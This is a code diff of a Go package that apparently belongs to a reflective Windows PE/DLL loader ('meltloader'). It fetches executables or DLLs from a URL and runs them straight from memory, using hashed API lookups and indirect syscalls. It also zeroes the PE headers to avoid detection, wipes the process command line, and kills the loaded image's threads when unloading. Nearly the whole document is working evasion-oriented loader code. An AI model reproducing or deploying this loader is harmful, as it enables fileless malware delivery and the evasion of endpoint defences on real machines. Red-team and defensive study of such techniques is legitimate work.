@@ -2,15 +2,16 @@ package pe
 
 import (
 	"fmt"
+	"strings"
 	"sync"
 	"time"
 	"unsafe"
 
 	wc "github.com/carved4/go-wincall"
-	"github.com/carved4/meltloader/pkg/net"
 )
 
-// Mapping represents a loaded DLL or PE in memory
+type DownloadFunc func(url string) ([]byte, error)
+
 type Mapping struct {
 	BaseAddr uintptr
 	Size     uint32
@@ -66,14 +67,13 @@ func loadPeInternal(peBytes []byte) uintptr {
 		srcSlice := unsafe.Slice((*byte)(unsafe.Pointer(src)), sizeOfRawData)
 		copy(dstSlice, srcSlice)
 	}
-	// fmt.Printf("[+] PE sections copied\n")
+
 	peHeaderAddrInMem := baseAddr + uintptr(peOffset)
 	optHeaderAddrInMem := peHeaderAddrInMem + 0x18
 	imageBase := uintptr(*(*uint64)(unsafe.Pointer(optHeaderAddrInMem + 0x18)))
-	// fmt.Printf("[+] imageBase: 0x%x\n", imageBase)
-	// fmt.Printf("[+] actual base: 0x%x\n", baseAddr)
+
 	delta := int64(baseAddr) - int64(imageBase)
-	// fmt.Printf("[+] delta: 0x%x\n", delta)
+
 	peOffset = *(*uint32)(unsafe.Pointer(baseAddr + 60))
 	peHeaderAddr = baseAddr + uintptr(peOffset)
 	optHeaderAddr = peHeaderAddr + 0x18
@@ -105,7 +105,7 @@ func loadPeInternal(peBytes []byte) uintptr {
 				oldValue := *(*uint64)(unsafe.Pointer(patchAddr))
 				newValue := uint64(int64(oldValue) + delta)
 				*(*uint64)(unsafe.Pointer(patchAddr)) = newValue
-			} else if relocType == 3 { // IMAGE_REL_BASED_HIGHLOW (x86)
+			} else if relocType == 3 {
 				oldValue := *(*uint32)(unsafe.Pointer(patchAddr))
 				newValue := uint32(int32(oldValue) + int32(delta))
 				*(*uint32)(unsafe.Pointer(patchAddr)) = newValue
@@ -114,16 +114,14 @@ func loadPeInternal(peBytes []byte) uintptr {
 		relocDir += uintptr(blockSize)
 	}
 
-	// fmt.Printf("[+] resolving imports\n")
 	peOffset = *(*uint32)(unsafe.Pointer(baseAddr + 60))
 	peHeaderAddr = baseAddr + uintptr(peOffset)
 	optHeaderAddr = peHeaderAddr + 0x18
 	importDirRVA := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x70 + (1 * 8)))
 	if importDirRVA == 0 {
-		// fmt.Println("[+] no imports")
+
 	}
 
-	// Get ExitThread address for patching exit functions
 	k32Base := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
 	exitThreadAddr := wc.GetFunctionAddress(k32Base, wc.GetHash("ExitThread"))
 
@@ -146,10 +144,9 @@ func loadPeInternal(peBytes []byte) uintptr {
 		}
 		dllName := string(unsafe.Slice((*byte)(unsafe.Pointer(dllNameAddr)), length))
 
-		// fmt.Printf("[+] processing imports from: %s\n", dllName)
 		hModule := wc.LoadLibraryLdr(dllName)
 		if hModule == 0 {
-			// fmt.Printf("[+] failed to load %s\n", dllName)
+
 			importDesc += 20
 			continue
 		}
@@ -158,10 +155,10 @@ func loadPeInternal(peBytes []byte) uintptr {
 			thunkRVA = firstThunk
 		}
 
-		thunkAddr := baseAddr + uintptr(thunkRVA) // Read from ILT
-		iatAddr := baseAddr + uintptr(firstThunk) // Write to IAT
+		thunkAddr := baseAddr + uintptr(thunkRVA)
+		iatAddr := baseAddr + uintptr(firstThunk)
 		for {
-			thunkValue := *(*uint64)(unsafe.Pointer(thunkAddr)) // x64
+			thunkValue := *(*uint64)(unsafe.Pointer(thunkAddr))
 
 			if thunkValue == 0 {
 				break
@@ -169,7 +166,7 @@ func loadPeInternal(peBytes []byte) uintptr {
 
 			var funcAddr uintptr
 			var funcName string
-			if (thunkValue & 0x8000000000000000) != 0 { // x64 ordinal flag
+			if (thunkValue & 0x8000000000000000) != 0 {
 				ordinal := uint16(thunkValue & 0xFFFF)
 				funcAddr, _, _ = wc.Call("kernel32.dll", "GetProcAddress", hModule, ordinal)
 			} else {
@@ -188,10 +185,9 @@ func loadPeInternal(peBytes []byte) uintptr {
 			}
 
 			if funcAddr == 0 {
-				// fmt.Printf("[+] failed to resolve!\n")
+
 			}
 
-			// Patch exit functions to ExitThread to prevent process termination
 			if funcName == "exit" || funcName == "ExitProcess" || funcName == "_exit" || funcName == "_Exit" || funcName == "quick_exit" {
 				funcAddr = exitThreadAddr
 			}
@@ -203,8 +199,6 @@ func loadPeInternal(peBytes []byte) uintptr {
 		importDesc += 20
 	}
 
-	// fmt.Println("[+] imports resolved")
-	// fmt.Printf("[+] running TLS callbacks\n")
 	peOffset = *(*uint32)(unsafe.Pointer(baseAddr + 60))
 	peHeaderAddr = baseAddr + uintptr(peOffset)
 	optHeaderAddr = peHeaderAddr + 0x18
@@ -222,7 +216,7 @@ func loadPeInternal(peBytes []byte) uintptr {
 	tlsDirRVA := *(*uint32)(unsafe.Pointer(optHeaderAddr + dataDirOffset + (9 * 8)))
 
 	if tlsDirRVA == 0 {
-		// fmt.Println("[+] no TLS callbacks")
+
 	}
 	tlsDir := baseAddr + uintptr(tlsDirRVA)
 	var callbacksVA uint64
@@ -232,7 +226,7 @@ func loadPeInternal(peBytes []byte) uintptr {
 		callbacksVA = uint64(*(*uint32)(unsafe.Pointer(tlsDir + 0x0C)))
 	}
 	if callbacksVA == 0 {
-		// fmt.Println("[+] no TLS callbacks (array is NULL)")
+
 	}
 	if callbacksVA > uint64(baseAddr) && callbacksVA < uint64(baseAddr+0x10000000) {
 		callbackArrayAddr := uintptr(callbacksVA)
@@ -248,7 +242,7 @@ func loadPeInternal(peBytes []byte) uintptr {
 			if callbackVA == 0 {
 				break
 			}
-			// its just an amstdcall so we can use CallG0 with callback VA as func addr, baseAddr, and 1=DLL_PROCESS_ATTACH
+
 			wc.CallG0(uintptr(callbackVA), baseAddr, 1, 0)
 
 			index++
@@ -259,8 +253,6 @@ func loadPeInternal(peBytes []byte) uintptr {
 	numSections = *(*uint16)(unsafe.Pointer(peHeaderAddr + 0x06))
 	sizeOfOptHeader = *(*uint16)(unsafe.Pointer(peHeaderAddr + 0x14))
 	sectionHeaderAddr := peHeaderAddr + 0x18 + uintptr(sizeOfOptHeader)
-
-	// fmt.Printf("[+] setting protections for %d sections\n", numSections)
 
 	for i := uint16(0); i < numSections; i++ {
 		sectionHeader := sectionHeaderAddr + uintptr(i*40)
@@ -275,17 +267,17 @@ func loadPeInternal(peBytes []byte) uintptr {
 
 		sectionAddr := baseAddr + uintptr(virtualAddress)
 		var protection uint32
-		if (characteristics & 0x20000000) != 0 { // Execute
-			if (characteristics & 0x80000000) != 0 { // Write
-				protection = 0x40 // PAGE_EXECUTE_READWRITE
+		if (characteristics & 0x20000000) != 0 {
+			if (characteristics & 0x80000000) != 0 {
+				protection = 0x40
 			} else {
-				protection = 0x20 // PAGE_EXECUTE_READ
+				protection = 0x20
 			}
 		} else {
-			if (characteristics & 0x80000000) != 0 { // Write
-				protection = 0x04 // PAGE_READWRITE
+			if (characteristics & 0x80000000) != 0 {
+				protection = 0x04
 			} else {
-				protection = 0x02 // PAGE_READONLY
+				protection = 0x02
 			}
 		}
 		var oldProtect uint32
@@ -313,12 +305,10 @@ func loadPeInternal(peBytes []byte) uintptr {
 	entryPointRVA := *(*uint32)(unsafe.Pointer(optHeaderAddrInMem + 0x10))
 	entryPoint := baseAddr + uintptr(entryPointRVA)
 
-	// zero out pe headers to avoid detection
 	for i := uintptr(0); i < uintptr(sizeOfHeaders); i++ {
 		*(*byte)(unsafe.Pointer(baseAddr + i)) = 0
 	}
 
-	// zero out command line args to prevent leakage
 	ntdllBase := wc.GetModuleBase(wc.GetHash("ntdll.dll"))
 	getPeb := wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlGetCurrentPeb"))
 	pebAddr, _, _ := wc.CallG0(getPeb)
@@ -344,11 +334,10 @@ func loadPeInternal(peBytes []byte) uintptr {
 		}
 	}
 
-	// fmt.Printf("[+] entry point at 0x%x\n", entryPoint)
 	rtlCreateUserThread := wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlCreateUserThread"))
 	ret, _, _ = wc.CallG0(rtlCreateUserThread, currProc, 0, 0, 0, 0, 0, entryPoint, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
 	if ret != 0 {
-		// fmt.Printf("[+] entry point failed to execute %x", ret)
+
 	}
 	wc.Call("kernel32.dll", "WaitForSingleObject", tHandle, 0xFFFFFFFF)
 	return baseAddr
@@ -358,15 +347,12 @@ func LoadPe(peBytes []byte) {
 	loadPeInternal(peBytes)
 }
 
-// LoadDLLFromURL downloads and loads a DLL from a URL with optional export execution
-func LoadDLLFromURL(url string, exportSpec string) (*Mapping, error) {
-	// Download the DLL bytes
-	dllBytes, err := net.DownloadToMemory(url)
+func LoadDLLFromURL(url string, exportSpec string, download DownloadFunc) (*Mapping, error) {
+	dllBytes, err := download(url)
 	if err != nil {
 		return nil, fmt.Errorf("failed to download DLL: %w", err)
 	}
 
-	// Parse PE headers to get size
 	if len(dllBytes) < 64 || dllBytes[0] != 'M' || dllBytes[1] != 'Z' {
 		return nil, fmt.Errorf("invalid PE file")
 	}
@@ -376,32 +362,31 @@ func LoadDLLFromURL(url string, exportSpec string) (*Mapping, error) {
 	optHeaderAddr := peHeaderAddr + 0x18
 	sizeOfImage := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x38))
 
-	// Load the DLL using LoadDLLRemote into our own process
 	currProc, _, _ := wc.Call("kernel32.dll", "GetCurrentProcess")
-
-	// Get base address before loading
-	ntAlloc := wc.GetSyscall(wc.GetHash("NtAllocateVirtualMemory"))
-	var baseAddr uintptr
-	var regionSize uintptr = uintptr(sizeOfImage)
-	ret, _ := wc.IndirectSyscall(ntAlloc.SSN, ntAlloc.Address, currProc, uintptr(unsafe.Pointer(&baseAddr)), 0, uintptr(unsafe.Pointer(&regionSize)), 0x00001000|0x00002000, 0x04)
-	if ret != 0 {
-		return nil, fmt.Errorf("failed to allocate memory")
-	}
-
-	// Load the DLL into our process
-	err = LoadDLLRemote(currProc, dllBytes)
+	baseAddr, err := LoadDLLRemote(currProc, dllBytes)
 	if err != nil {
 		return nil, fmt.Errorf("failed to load DLL: %w", err)
 	}
 
-	// Create mapping entry
+	if exportSpec != "" {
+		exportName := exportSpec
+		if strings.HasPrefix(exportSpec, "export_only:") {
+			exportName = strings.TrimPrefix(exportSpec, "export_only:")
+		}
+		if exportName != "" {
+			funcAddr := resolveExport(baseAddr, exportName)
+			if funcAddr != 0 {
+				wc.CallG0(funcAddr)
+			}
+		}
+	}
+
 	mapping := &Mapping{
 		BaseAddr: baseAddr,
 		Size:     sizeOfImage,
 		IsDLL:    true,
 	}
 
-	// Store in tracking map
 	mappingsMutex.Lock()
 	dllMappings[baseAddr] = mapping
 	mappingsMutex.Unlock()
@@ -409,15 +394,54 @@ func LoadDLLFromURL(url string, exportSpec string) (*Mapping, error) {
 	return mapping, nil
 }
 
-// LoadPEFromUrl downloads and loads a PE from a URL with optional sleep before execution
-func LoadPEFromUrl(url string, sleepSeconds int) (*Mapping, error) {
-	// Download the PE bytes
-	peBytes, err := net.DownloadToMemory(url)
+func resolveExport(baseAddr uintptr, exportName string) uintptr {
+	peOffset := *(*uint32)(unsafe.Pointer(baseAddr + 60))
+	peHeaderAddr := baseAddr + uintptr(peOffset)
+	optHeaderAddr := peHeaderAddr + 0x18
+
+	exportDirRVA := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x70))
+	if exportDirRVA == 0 {
+		return 0
+	}
+
+	exportDir := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(baseAddr + uintptr(exportDirRVA)))
+	nameCount := exportDir.NumberOfNames
+	if nameCount == 0 {
+		return 0
+	}
+
+	namesRVA := baseAddr + uintptr(exportDir.AddressOfNames)
+	ordinalsRVA := baseAddr + uintptr(exportDir.AddressOfNameOrdinals)
+	functionsRVA := baseAddr + uintptr(exportDir.AddressOfFunctions)
+
+	for i := uint32(0); i < nameCount; i++ {
+		nameRVA := *(*uint32)(unsafe.Pointer(namesRVA + uintptr(i*4)))
+		nameAddr := baseAddr + uintptr(nameRVA)
+
+		length := 0
+		for {
+			c := *(*byte)(unsafe.Pointer(nameAddr + uintptr(length)))
+			if c == 0 {
+				break
+			}
+			length++
+		}
+		name := string(unsafe.Slice((*byte)(unsafe.Pointer(nameAddr)), length))
+		if name == exportName {
+			ordinal := *(*uint16)(unsafe.Pointer(ordinalsRVA + uintptr(i*2)))
+			funcRVA := *(*uint32)(unsafe.Pointer(functionsRVA + uintptr(uint32(ordinal)*4)))
+			return baseAddr + uintptr(funcRVA)
+		}
+	}
+	return 0
+}
+
+func LoadPEFromUrl(url string, sleepSeconds int, download DownloadFunc) (*Mapping, error) {
+	peBytes, err := download(url)
 	if err != nil {
 		return nil, fmt.Errorf("failed to download PE: %w", err)
 	}
 
-	// Parse PE headers to get size
 	if len(peBytes) < 64 || peBytes[0] != 'M' || peBytes[1] != 'Z' {
 		return nil, fmt.Errorf("invalid PE file")
 	}
@@ -427,25 +451,21 @@ func LoadPEFromUrl(url string, sleepSeconds int) (*Mapping, error) {
 	optHeaderAddr := peHeaderAddr + 0x18
 	sizeOfImage := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x38))
 
-	// Optional sleep
 	if sleepSeconds > 0 {
 		time.Sleep(time.Duration(sleepSeconds) * time.Second)
 	}
 
-	// Load the PE and get the base address
 	baseAddr := loadPeInternal(peBytes)
 	if baseAddr == 0 {
 		return nil, fmt.Errorf("failed to load PE")
 	}
 
-	// Create mapping entry
 	mapping := &Mapping{
 		BaseAddr: baseAddr,
 		Size:     sizeOfImage,
 		IsDLL:    false,
 	}
 
-	// Store in tracking map
 	mappingsMutex.Lock()
 	peMappings[baseAddr] = mapping
 	mappingsMutex.Unlock()
@@ -453,7 +473,6 @@ func LoadPEFromUrl(url string, sleepSeconds int) (*Mapping, error) {
 	return mapping, nil
 }
 
-// GetMap returns information about currently mapped DLLs
 func GetMap() ([]uintptr, []uint32, int) {
 	mappingsMutex.RLock()
 	defer mappingsMutex.RUnlock()
@@ -470,7 +489,6 @@ func GetMap() ([]uintptr, []uint32, int) {
 	return baseAddrs, sizes, count
 }
 
-// GetPEMap returns information about currently mapped PEs
 func GetPEMap() ([]uintptr, []uint32, int) {
 	mappingsMutex.RLock()
 	defer mappingsMutex.RUnlock()
@@ -487,24 +505,71 @@ func GetPEMap() ([]uintptr, []uint32, int) {
 	return baseAddrs, sizes, count
 }
 
-// Melt removes a DLL mapping from memory and tracking
+func killThreadsInRange(base uintptr, size uint32) {
+	const TH32CS_SNAPTHREAD = 0x00000004
+	const THREAD_QUERY_INFORMATION = 0x0040
+	const THREAD_TERMINATE = 0x0001
+	const ThreadQuerySetWin32StartAddress = 9
+
+	pid, _, _ := wc.Call("kernel32.dll", "GetCurrentProcessId")
+
+	snap, _, _ := wc.Call("kernel32.dll", "CreateToolhelp32Snapshot", TH32CS_SNAPTHREAD, 0)
+	if snap == 0 || snap == ^uintptr(0) {
+		return
+	}
+	defer wc.Call("kernel32.dll", "CloseHandle", snap)
+
+	var te ThreadEntry32
+	te.Size = uint32(unsafe.Sizeof(te))
+
+	ok, _, _ := wc.Call("kernel32.dll", "Thread32First", snap, uintptr(unsafe.Pointer(&te)))
+	if ok == 0 {
+		return
+	}
+
+	ntQueryInfo := wc.GetSyscall(wc.GetHash("NtQueryInformationThread"))
+	regionEnd := base + uintptr(size)
+
+	for {
+		if uintptr(te.OwnerProcessID) == pid {
+			hThread, _, _ := wc.Call("kernel32.dll", "OpenThread",
+				THREAD_QUERY_INFORMATION|THREAD_TERMINATE, 0, uintptr(te.ThreadID))
+			if hThread != 0 {
+				var startAddr uintptr
+				ret, _ := wc.IndirectSyscall(ntQueryInfo.SSN, ntQueryInfo.Address,
+					hThread, uintptr(ThreadQuerySetWin32StartAddress),
+					uintptr(unsafe.Pointer(&startAddr)), unsafe.Sizeof(startAddr), 0)
+				if ret == 0 && startAddr >= base && startAddr < regionEnd {
+					wc.Call("kernel32.dll", "TerminateThread", hThread, 0)
+				}
+				wc.Call("kernel32.dll", "CloseHandle", hThread)
+			}
+		}
+
+		ok, _, _ = wc.Call("kernel32.dll", "Thread32Next", snap, uintptr(unsafe.Pointer(&te)))
+		if ok == 0 {
+			break
+		}
+	}
+}
+
 func Melt(mapping *Mapping) error {
 	if mapping == nil {
 		return fmt.Errorf("nil mapping")
 	}
 
-	// Remove from tracking
+	killThreadsInRange(mapping.BaseAddr, mapping.Size)
+
 	mappingsMutex.Lock()
 	delete(dllMappings, mapping.BaseAddr)
 	mappingsMutex.Unlock()
 
-	// Free the memory
 	ntFree := wc.GetSyscall(wc.GetHash("NtFreeVirtualMemory"))
 	currProc, _, _ := wc.Call("kernel32.dll", "GetCurrentProcess")
 	var baseAddr uintptr = mapping.BaseAddr
 	var regionSize uintptr = 0
 
-	ret, _ := wc.IndirectSyscall(ntFree.SSN, ntFree.Address, currProc, uintptr(unsafe.Pointer(&baseAddr)), uintptr(unsafe.Pointer(&regionSize)), 0x00008000) // MEM_RELEASE
+	ret, _ := wc.IndirectSyscall(ntFree.SSN, ntFree.Address, currProc, uintptr(unsafe.Pointer(&baseAddr)), uintptr(unsafe.Pointer(&regionSize)), 0x00008000)
 	if ret != 0 {
 		return fmt.Errorf("NtFreeVirtualMemory failed: 0x%x", ret)
 	}
@@ -512,24 +577,23 @@ func Melt(mapping *Mapping) error {
 	return nil
 }
 
-// MeltPE removes a PE mapping from memory and tracking
 func MeltPE(mapping *Mapping) error {
 	if mapping == nil {
 		return fmt.Errorf("nil mapping")
 	}
 
-	// Remove from tracking
+	killThreadsInRange(mapping.BaseAddr, mapping.Size)
+
 	mappingsMutex.Lock()
 	delete(peMappings, mapping.BaseAddr)
 	mappingsMutex.Unlock()
 
-	// Free the memory
 	ntFree := wc.GetSyscall(wc.GetHash("NtFreeVirtualMemory"))
 	currProc, _, _ := wc.Call("kernel32.dll", "GetCurrentProcess")
 	var baseAddr uintptr = mapping.BaseAddr
 	var regionSize uintptr = 0
 
-	ret, _ := wc.IndirectSyscall(ntFree.SSN, ntFree.Address, currProc, uintptr(unsafe.Pointer(&baseAddr)), uintptr(unsafe.Pointer(&regionSize)), 0x00008000) // MEM_RELEASE
+	ret, _ := wc.IndirectSyscall(ntFree.SSN, ntFree.Address, currProc, uintptr(unsafe.Pointer(&baseAddr)), uintptr(unsafe.Pointer(&regionSize)), 0x00008000)
 	if ret != 0 {
 		return fmt.Errorf("NtFreeVirtualMemory failed: 0x%x", ret)
 	}
